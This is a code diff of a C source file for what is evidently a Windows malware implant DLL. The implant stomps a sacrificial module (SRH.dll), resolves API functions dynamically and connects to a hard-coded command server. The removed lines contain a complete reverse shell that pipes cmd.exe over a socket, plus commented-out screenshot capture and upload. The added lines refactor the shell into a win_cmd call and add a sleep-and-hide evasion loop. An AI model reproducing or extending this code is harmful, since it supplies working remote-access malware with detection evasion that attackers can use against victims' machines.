@@ -1,4 +1,6 @@
 ﻿#include "pch.h"
+#include "framework.h"
+#include "types.h"
 #include "headers.h"
 #include "misc.h"
 #include "hwbp.h"
@@ -6,9 +8,11 @@
 #include "swappala.h"
 #include "sleaping.h"
 #include <stdint.h>
-#include "utils.h"
-#include "utils_headers.h"
 #include "mylibc.h"
+#include "net.h"
+#include "utils.h"
+#include "file.h"
+#include "dll_headers.h"
 
 typedef struct _SAC_DLL_HEADER
 {
@@ -652,12 +656,8 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 static SOCKET connect_to_server(winsock_functions_t* ws_funcs, kernel32_functions_t* krnl_funcs)
 {
 	SOCKET socket = INVALID_SOCKET;
-	if (startup_wsa(ws_funcs) != 0)
-	{
-		return socket;
-	}
 
-	socket = init_connection(SERVER_HOSTNAME, SERVER_PORT, ws_funcs, krnl_funcs);
+	socket = init_connection(SERVER_HOSTNAME, SERVER_PORT, ws_funcs);
 	if (socket == INVALID_SOCKET)
 	{
 		cleanup_wsa(ws_funcs);
@@ -667,16 +667,18 @@ static SOCKET connect_to_server(winsock_functions_t* ws_funcs, kernel32_function
 }
 
 
-static BOOL custom_process_attach(HMODULE hModule)
+static status_t custom_process_attach(HMODULE hModule)
 {
-	int status = 0;
+	status_t status = 0;
+	sleaping_para_t sleaping_para = { 0 };
+	//sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs
 
 	PSAC_DLL_HEADER sac_dll_header = NULL;
 
 	// even if unmapped it's in the PEB
 	PBYTE sac_dll_base = (PBYTE)GetModuleHandleA("SRH.dll");
 	if (sac_dll_base == NULL)
-		return FALSE;
+		return ST_ERROR;
 
 	sac_dll_header = (PSAC_DLL_HEADER)sac_dll_base;
 
@@ -692,166 +694,66 @@ static BOOL custom_process_attach(HMODULE hModule)
 	if (VirtualFree(old_memory, 0, MEM_RELEASE) == 0)
 	{
 		// error releasing old buffer
-		return FALSE;
+		return ST_ERROR;
 	}
 
 	// initialize functions 
 	nt_functions_t nt_funcs = { 0 };
 	if (!load_nt_functions(&nt_funcs))
 	{
-		return FALSE;
+		return ST_ERROR;
 	}
 
-	
+	sleaping_para.image_base = sac_dll_base;
+	sleaping_para.sac_dll_handle = sac_dll_handle;
+	sleaping_para.mal_dll_handle = mal_dll_handle;
+	sleaping_para.view_size = sac_dll_size;
+	sleaping_para.nt = &nt_funcs;
+
 	global_functions_t global_functions = { 0 };
 
 	if (!load_winsock_functions(&global_functions.ws2))
 	{
-		return FALSE;
-	}
-
-	if (!load_kernel32_functions(&global_functions.kernel32))
-	{
-		return FALSE;
-	}
-
-	if (!load_user32_functions(&global_functions.user32))
-	{
-		return FALSE;
+		return ST_ERROR;
 	}
 	
 	if (!load_gdi32_functions(&global_functions.gdi32))
 	{
-		return FALSE;
+		return ST_ERROR;
 	}
 
 
-	
-	SOCKET socket = connect_to_server(&global_functions.ws2, &global_functions.kernel32);
-
-	HANDLE hChildStd_OUT_Rd = NULL;
-	HANDLE hChildStd_OUT_Wr = NULL;
-	HANDLE hChildStd_IN_Rd = NULL;
-	HANDLE hChildStd_IN_Wr = NULL;
-
-	// 创建输出管道
-	if (!CreatePipeWithSecurity(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr)) {
-		//printf("CreatePipe failed\n");
-		return FALSE;
-	}
-
-	// 创建输入管道
-	if (!CreatePipeWithSecurity(&hChildStd_IN_Rd, &hChildStd_IN_Wr)) {
-		//printf("CreatePipe failed\n");
-		return FALSE;
-	}
-
-	SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
-	SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);
-
-	char cmd[] = "cmd.exe";
-
-	if (CreateChildProcessWithRedirect(
-		cmd,
-		hChildStd_IN_Rd,
-		hChildStd_OUT_Wr,
-		hChildStd_OUT_Wr
-	)) 
+	if (startup_wsa(&global_functions.ws2) != 0)
 	{
-		CloseHandle(hChildStd_IN_Rd);
-		CloseHandle(hChildStd_OUT_Wr);
-
-
-		char input[MAX_NAME_LEN];
-		char stdout_buf[BUFSIZE];
-		//char end_signal[16] = "^^^c2cctt**^^^";
-
-		while (ReadFromPipe(hChildStd_OUT_Rd, stdout_buf, BUFSIZE) > 0) {
-			break;
-		}
-
-		my_memset(input, 0, MAX_NAME_LEN);
-		my_memset(stdout_buf, 0, BUFSIZE);
-
-		while (1)
-		{
-			if (recv_data(socket, input, MAX_NAME_LEN, &global_functions.ws2, &global_functions.kernel32) != 0)
-			{
-				break;
-			}
-
-			if (!my_strcmp(input, "hide"))
-			{
-				if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
-				{
-					break;
-				}
-
-				continue;
-			}
-
-			WriteToPipe(hChildStd_IN_Wr, input);
-			while (ReadFromPipe(hChildStd_OUT_Rd, stdout_buf, BUFSIZE) > 0)
-			{
-
-				//int* buggy = NULL;
-				//*buggy = 0xAAAAAAAA;
-
-				if (send_data(socket, stdout_buf, BUFSIZE, &global_functions.ws2, &global_functions.kernel32) != 0);
-					break;
-			}
-
-			//if (send_data(socket, end_signal, 16, &global_functions.ws2, &global_functions.kernel32) != 0);
-			//	break;
-
-			if (!my_strcmp(input, "exit"))
-			{
-				break;
-			}
-
-		}
-
-
+		return ST_ERROR;
 	}
 
-	//do
-	//{
-	//	char* filename = create_temp_filename("screenshot", &global_functions.kernel32);
-	//	my_strncat(filename, ".bmp", 4);
+	SOCKET socket = INVALID_SOCKET;
 
-	//	
-	//	status = capture_screenshot_win32(filename, &global_functions.kernel32, &global_functions.user32, &global_functions.gdi32);
+	socket = init_connection(SERVER_HOSTNAME, SERVER_PORT, &global_functions.ws2);
+	if (socket == INVALID_SOCKET)
+	{
+		cleanup_wsa(&global_functions.ws2);
+		return ST_SOCKET_ERROR;
+	}
 
-	//	//int* buggy = NULL;
-	//	//*buggy = 0xAAAAAAAA;
-
-	//	status = send_file(socket, filename, &global_functions.ws2, &global_functions.kernel32);
-
-	//	if (status != 0)
-	//	{
-	//		// reconnect
-	//	}
-
-	//	cleanup_temp_file(filename, &global_functions.kernel32);
-
-	//	if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
-	//	{
-	//		return FALSE;
-	//	}
-
-	//} while (true);
-
+	status = win_cmd(socket);
+	
 	do
 	{
 		//MessageBoxA(NULL, "Ciallo～(∠ · ω< )⌒☆", "Ciallo～(∠ · ω< )⌒☆", MB_ICONERROR);
-		if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
+		status = sleaping(&sleaping_para);
+		if (ST_FAILED(status))
 		{
 			//MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
-			return FALSE;
+			break;
 		}
 	} while (true);
 
-	return TRUE;
+__cleanup_0:
+	cleanup_wsa(&global_functions.ws2);
+
+	return status;
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule,
